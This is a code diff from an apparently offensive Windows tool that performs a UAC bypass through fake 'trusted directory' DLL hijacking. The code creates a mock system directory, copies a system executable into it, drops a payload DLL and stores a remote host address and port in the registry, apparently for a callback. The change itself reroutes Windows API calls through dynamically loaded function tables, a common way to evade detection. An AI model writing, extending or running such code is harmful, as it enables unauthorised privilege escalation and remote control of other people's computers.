@@ -8,23 +8,25 @@
 #include "Message.h"
 #include "DropFile.h"
 
+#include "LoadAPI.h"
+
 #if _WIN64
 #include "UacBypassDll64.h"
 #else
 #include "UacBypassDll32.h"
 #endif*/
 
-BOOL CheckExploit(char* exeName, char* dllName) {
+BOOL CheckExploit(Advapi32_API advapi, char* exeName, char* dllName) {
     BOOL result = FALSE;
 
     char* buffer = (char*)malloc(MAX_PATH);
     if (buffer != NULL) {
         const char* regKey = "Software\\Wincat";
 
-        if (ReadRegistryValue(HKEY_CURRENT_USER, (char*)regKey, "test", buffer, MAX_PATH)) {
+        if (ReadRegistryValue(advapi,HKEY_CURRENT_USER, (char*)regKey, "test", buffer, MAX_PATH)) {
             result = strcmp(buffer, "1") == 0;
             Sleep(1000);
-            if (!RegDelnodeRecurse(HKEY_CURRENT_USER, (char*)regKey))
+            if (!RegDelnodeRecurse(advapi,HKEY_CURRENT_USER, (char*)regKey))
                 printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Fail to clear reg key: HKCU:%s", regKey);
         }
         free(buffer);
@@ -203,7 +205,7 @@ BOOL FullCleanUp(char* fakeSystemDir) {
     RemoveFakeDirectory(fakeSystemDir);
     return TRUE;
 }
-BOOL ExploitDT(char* exeName, char* dllName, char* system32Path, char* fakeSystemDir) {
+BOOL ExploitDT(Advapi32_API advapi32, char* exeName, char* dllName, char* system32Path, char* fakeSystemDir) {
     if (CreateFakeDirectory(fakeSystemDir)) {
         if (CopyExeFile(system32Path, fakeSystemDir, exeName)) {
             if (DropDllFile(fakeSystemDir, dllName)) {
@@ -211,7 +213,7 @@ BOOL ExploitDT(char* exeName, char* dllName, char* system32Path, char* fakeSyste
 
                 Sleep(100);
                 CleanUpFakeDirectory(fakeSystemDir, exeName, dllName);
-                return CheckExploit(exeName, dllName);
+                return CheckExploit(advapi32,exeName, dllName);
             }
         }
     }
@@ -222,7 +224,7 @@ BOOL ExploitDT(char* exeName, char* dllName, char* system32Path, char* fakeSyste
 
 
 
-BOOL GetFakeSystemPath(char** system32Path, char** fakeSystemDir) {
+BOOL GetFakeSystemPath(Kernel32_API kernel32, char** system32Path, char** fakeSystemDir) {
     *fakeSystemDir = (char*)malloc(MAX_PATH + 1);
     if (*fakeSystemDir == NULL) {
         printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Failed to allocate memory");
@@ -234,7 +236,7 @@ BOOL GetFakeSystemPath(char** system32Path, char** fakeSystemDir) {
         free(*fakeSystemDir);
         return FALSE;
     }
-    if (GetWindowsDirectoryA(*system32Path, MAX_PATH + 1) == 0) {
+    if (kernel32.GetWindowsDirectoryAF(*system32Path, MAX_PATH + 1) == 0) {
         printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Failed to get system directory !");
         free(*fakeSystemDir);
         free(*system32Path);
@@ -247,23 +249,23 @@ BOOL GetFakeSystemPath(char** system32Path, char** fakeSystemDir) {
 
 
 
-BOOL ExploitTrustedDirectories(char* PathExeToRun, WCHAR* UipAddress, char* port) {
+BOOL ExploitTrustedDirectories(Kernel32_API kernel32, Advapi32_API advapi32, char* PathExeToRun, WCHAR* UipAddress, char* port) {
     BOOL exploitSuccessed = FALSE;
     char* system32Path = NULL;
     char* fakeSystemDir = NULL;
 
-    if (!GetFakeSystemPath(&system32Path, &fakeSystemDir))
+    if (!GetFakeSystemPath(kernel32, &system32Path, &fakeSystemDir))
         return FALSE;
 
     printMsg(STATUS_INFO2, LEVEL_DEFAULT, "System directory:\t\t'%s'\n", system32Path);
     printMsg(STATUS_INFO2, LEVEL_DEFAULT, "System fake directory:\t'%s'\n", fakeSystemDir);
 
-    if (!SaveRHostInfo(UipAddress, port)){
+    if (!SaveRHostInfo(advapi32, UipAddress, port)) {
         free(system32Path);
         free(fakeSystemDir);
         return FALSE;
     }
-    if (!SaveCPathInfo(PathExeToRun)) {
+    if (!SaveCPathInfo(advapi32,PathExeToRun)) {
         printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Fail to save info in reg");
         free(system32Path);
         free(fakeSystemDir);
@@ -274,7 +276,7 @@ BOOL ExploitTrustedDirectories(char* PathExeToRun, WCHAR* UipAddress, char* port
     for (int i = 0; i < sizeof(dllList) / sizeof(DllList) && !exploitSuccessed; i++) {
         for (int j = 0; j < dllList[i].tableSize && !exploitSuccessed; j++) {
             printMsg(STATUS_OK2, LEVEL_DEFAULT, "Target: %s -> %s\n", dllList[i].name, dllList[i].dllTable[j]);
-            if (ExploitDT((char*)dllList[i].name, (char*)dllList[i].dllTable[j], system32Path, fakeSystemDir)) {
+            if (ExploitDT(advapi32,(char*)dllList[i].name, (char*)dllList[i].dllTable[j], system32Path, fakeSystemDir)) {
                 printMsg(STATUS_OK2, LEVEL_DEFAULT, "Vulnerable: %s -> %s\n", dllList[i].name, dllList[i].dllTable[j]);
                 exploitSuccessed = TRUE;
             }
